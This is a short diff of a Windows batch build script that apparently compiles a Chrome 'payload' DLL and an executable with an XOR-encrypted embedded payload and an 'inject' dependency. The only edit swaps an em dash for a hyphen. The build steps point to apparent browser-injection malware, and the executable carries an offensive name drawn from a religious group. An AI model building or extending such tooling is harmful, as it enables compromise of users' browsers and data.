@@ -130,7 +130,7 @@ for %%F in ("target\release\chrome_payload.dll") do echo     payload DLL: %%~zF 
 echo.
 echo [*] Step 2/2: jewish.exe (build.rs embeds XOR-encrypted payload)...
 echo     inject crate is built automatically as a dependency.
-echo     Final link step may pause at 237/238 for 30-90s — normal.
+echo     Final link step may pause at 237/238 for 30-90s - normal.
 cargo build --release -p jewish
 if errorlevel 1 goto build_fail
 if not exist "target\release\jewish.exe" (
